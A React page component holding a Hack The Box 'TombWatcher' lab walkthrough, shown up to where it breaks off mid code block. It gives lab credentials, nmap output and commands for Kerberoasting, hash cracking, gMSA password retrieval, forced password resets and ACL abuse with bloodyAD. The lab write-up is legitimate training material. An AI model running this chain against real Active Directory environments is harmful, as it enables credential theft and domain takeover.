import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { FaArrowLeft, FaCalendar, FaServer, FaStar, FaDesktop, FaNetworkWired, FaCopy, FaCheck } from 'react-icons/fa';
import TableOfContents from '../../../components/TableOfContents';
import InfoStatus from '../../../components/InfoStatus';
import ScrollToTop from '../../../components/ScrollToTop';
import DynamicSEO from '../../../components/DynamicSEO';
import './TombwatcherWalkthrough.css';

const TombwatcherWalkthrough = () => {
  const navigate = useNavigate();

  // CodeBlock component for terminal-like code blocks
  const CodeBlock = ({ language, children }) => {
    const [copied, setCopied] = useState(false);
    
    const handleCopy = async () => {
      try {
        await navigator.clipboard.writeText(children);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      } catch (err) {
        console.error('Failed to copy text: ', err);
      }
    };

    const displayLanguage = language === 'bash' ? 'Shell' : language;
    const showPrompt = language === 'bash' || language === 'shell';

    return (
      <div className="code-block-container">
        <div className="code-block-header">
          <span className="code-block-language">{displayLanguage || 'Terminal'}</span>
          <button 
            className={'copy-button ' + (copied ? 'copied' : '')}
            onClick={handleCopy}
            title={copied ? 'Copied!' : 'Copy to clipboard'}
          >
            {copied ? <FaCheck /> : <FaCopy />}
          </button>
        </div>
        <pre>
          <code className={'terminal-code ' + (language ? 'language-' + language : '')}>
            {showPrompt && <span className="terminal-prompt">$ </span>}
            {children}
          </code>
        </pre>
      </div>
    );
  };

  // Function to parse inline markdown (bold, italic, inline code, links)
  const parseInlineMarkdown = (text) => {
    const parts = [];
    let lastIndex = 0;
    let key = 0;
    
    // Regex to match [text](url), **bold**, *italic*, and `code`
    const regex = /(\[.*?\]\(.*?\)|\*\*.*?\*\*|\*.*?\*|`.*?`)/g;
    let match;
    
    while ((match = regex.exec(text)) !== null) {
      // Add text before the match
      if (match.index > lastIndex) {
        parts.push(text.substring(lastIndex, match.index));
      }
      
      const matched = match[0];
      
      if (matched.startsWith('[') && matched.includes('](')) {
        // Link [text](url)
        const linkMatch = matched.match(/\[(.*?)\]\((.*?)\)/);
        if (linkMatch) {
          const [, linkText, linkUrl] = linkMatch;
          parts.push(
            <a key={key++} href={linkUrl} target="_blank" rel="noopener noreferrer" className="content-link">
              {linkText}
            </a>
          );
        }
      } else if (matched.startsWith('**') && matched.endsWith('**')) {
        // Bold text
        parts.push(<strong key={key++}>{matched.slice(2, -2)}</strong>);
      } else if (matched.startsWith('*') && matched.endsWith('*')) {
        // Italic text
        parts.push(<em key={key++}>{matched.slice(1, -1)}</em>);
      } else if (matched.startsWith('`') && matched.endsWith('`')) {
        // Inline code
        parts.push(<code key={key++} className="inline-code">{matched.slice(1, -1)}</code>);
      }
      
      lastIndex = regex.lastIndex;
    }
    
    // Add remaining text
    if (lastIndex < text.length) {
      parts.push(text.substring(lastIndex));
    }
    
    return parts.length > 0 ? parts : text;
  };

  // TombWatcher data
  const writeup = {
    id: 'tombwatcher-walkthrough',
    title: 'TombWatcher Walkthrough',
    excerpt: 'TombWatcher - This writeup documents the discovery and analysis of vulnerabilities, exploitation techniques, and privilege escalation methods.',
    date: 'Oct 11, 2025',
    tags: ['Htb', 'Ad', 'Adcs', 'Password-Cracking', 'Gmsa', 'Kerberoasting', 'Kerberos', 'Tombstone', 'Esc15'],
    difficulty: 'Medium',
    os: 'Windows',
    ip: '10.129.192.159',
    content: `# TombWatcher

## Overview
This writeup documents the discovery and analysis of vulnerabilities, exploitation techniques, and privilege escalation methods for the TombWatcher machine.
<InfoStatus title="Info Status:" message="As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!" />

## Enumeration
### Port Scanning
Running \`Nmap\` port scanner to enumerate the services running on the target machine. From the nmap scan we have an indication that the target is running a Windows machine with \`Active Directory\` services. The scan reveals several critical ports including LDAP (389, 636, 3268, 3269), Kerberos (88), SMB (445, 139), and WinRM (5985), which are typical indicators of an Active Directory Domain Controller.
\`\`\`bash
sudo nmap -vv -sS -sV -sC -p- --min-rate=10000 10.129.192.159 -oN nmap/log.nmap

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-07 23:00:54Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-07T23:02:25+00:00; +4h00m05s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-07T23:02:25+00:00; +4h00m05s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
|_ssl-date: 2025-06-07T23:02:25+00:00; +4h00m05s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
|_ssl-date: 2025-06-07T23:02:25+00:00; +4h00m05s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
64305/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h00m04s, deviation: 0s, median: 4h00m04s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 37289/tcp): CLEAN (Timeout)
|   Check 2 (port 31791/tcp): CLEAN (Timeout)
|   Check 3 (port 30145/udp): CLEAN (Timeout)
|   Check 4 (port 59070/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-06-07T23:01:45
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
\`\`\`

We can see some important open ports:
• **Port 53**: DNS service running Simple DNS Plus
• **Port 88**: Kerberos service running Microsoft Windows Kerberos
• **Port 135**: Microsoft Windows RPC service
• **Port 139**: NetBIOS-SSN service
• **Port 389**: LDAP service (Active Directory)
• **Port 445**: Microsoft SMB service
• **Port 464**: Kerberos password change service
• **Port 593**: RPC over HTTP service
• **Port 636**: LDAPS (LDAP over SSL)

### Service Enumeration
Enumerating the SMB shares with \`Henry\` credentials.
\`\`\`bash
nxc smb 10.129.192.159 -u henry -p 'H3nry_987TGV!' --shares 
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/1.png)

Making the Active Directory collection with \`rusthound-ce\`. This tool will map out the entire Active Directory structure, including users, groups, computers, and their relationships, which is crucial for understanding potential attack paths and privilege escalation opportunities.
\`\`\`bash
rusthound-ce -d tombwatcher.htb -u 'henry@10.129.192.159' -p 'H3nry_987TGV!' -c All -z
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/2.png)

Retrieving and filtering all valid users.
\`\`\`bash
nxc smb 10.129.192.159 -u henry -p 'H3nry_987TGV!' --rid-brute > a.txt | grep "SidTypeUser" | awk -F " " '{print $6}' | cut -d '\\' -f 2 > users.txt
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/3.png)

On BloodHound we gonna find that the user \`Henry\` have \`WriteSPN\` privilege into \`Alfred\` user.
![Service Enumeration](/images/writeups/tombwatcher/4.png)

## Foothold
### Exploitation
We can change the SPN from \`Alfred\`. With the \`TargetedKerberoast\` tool we will find that this user it;s kerberoastable.
\`\`\`bash
ftime -d tombwatcher.htb targetedKerberoast.py -v -d tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!'
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/5.png)

Cracking the service ticket (TGS) hash from \`Alfred\`.
\`\`\`bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/6.png)

Validating \`Alfred credentials\`.
\`\`\`bash
nxc smb 10.129.192.159 -u alfred -p basketball
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/7.png)

## Post Exploitation
### Lateral Movement - Addself and GMSA 
The \`Alfred\` user have \`AddSelf\` privilege into \`Infrastructure\` group.
![Service Enumeration](/images/writeups/tombwatcher/8.png)

Using \`bloodyAD\` to add \`Alfred\` to \`Infrastructure\` group.
\`\`\`bash
bloodyAD --host DC01.tombwatcher.htb --dc-ip 10.129.192.159 -d tombwatcher.htb -u alfred -p basketball add groupMember infrastructure alfred
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/9.png)

Users that are in the \`Infrastructure\` group have the privileged to read the GMSA password from \`ansible_dev$\` account.
![Service Enumeration](/images/writeups/tombwatcher/10.png)

Retrieving the GMSA password from \`ansible_dev$\` account with \`netexec\`.
\`\`\`bash
nxc ldap 10.129.192.159 -u alfred -p basketball --gmsa
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/11.png)

Validating the \`ansible_dev$\` credentials.
\`\`\`bash
nxc smb 10.129.192.159 -u 'ansible_dev$' -H 1c37d00093dc2a5f25176bf2d474afdc
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/12.png)

### Lateral Movement - ForceChangePassword
The \`ansible_dev$\` account have \`ForceChangePassword\` privilege into \`sam\` account.
![Service Enumeration](/images/writeups/tombwatcher/13.png)

With \`bloodyAD\` we can change the password of \`sam\` account to \`P@ssw0rd!\`.
\`\`\`bash
bloodyAD --host 10.129.192.159 -d tombwatcher.htb -u 'ansible_dev$' -p :1c37d00093dc2a5f25176bf2d474afdc set password sam P@ssw0rd!
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/14.png)

### Lateral Movement - WriteOwner
The \`Sam\` account have \`WriteOwner\` privilege into \`John\` account. With that privilege we can change the owner of \`John\` account to \`Sam\`.
![Service Enumeration](/images/writeups/tombwatcher/15.png)

Using \`bloodyAD\` to change the owner of \`John\` account to \`Sam\`, adding a genericAll privilege to \`Sam\` account and making a shadow credential to \`John\` account.
\`\`\`bash
